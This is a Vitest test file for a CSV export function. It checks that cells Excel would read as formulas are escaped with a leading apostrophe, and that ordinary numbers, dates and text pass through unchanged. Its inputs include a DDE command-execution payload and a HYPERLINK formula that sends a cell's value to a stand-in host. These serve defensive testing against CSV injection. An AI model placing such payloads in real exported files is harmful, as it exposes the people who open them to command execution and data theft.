import { describe, expect, it } from "vitest";
import { cell, csv } from "@/lib/csv-export";

describe("exportación CSV", () => {
  it("neutraliza los textos que Excel tomaría por fórmulas", () => {
    expect(cell("=1+1")).toBe("'=1+1");
    expect(cell("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(cell("@SUM(1+1)")).toBe("'@SUM(1+1)");
    expect(cell("-2+3")).toBe("'-2+3");
    expect(cell("\t=1")).toBe("'\t=1");
    expect(cell('=HYPERLINK("https://x.example/?d="&E2;"Ver")')).toBe(`"'=HYPERLINK(""https://x.example/?d=""&E2;""Ver"")"`);
  });
  it("deja igual números y textos normales", () => {
    expect(cell(-2.5)).toBe("-2,5");
    expect(cell(null)).toBe("");
    expect(cell("Tomate; pera")).toBe('"Tomate; pera"');
    expect(cell("2026-09-01")).toBe("2026-09-01");
    expect(csv([["a", 1]])).toBe("﻿a;1\r\n");
  });
});
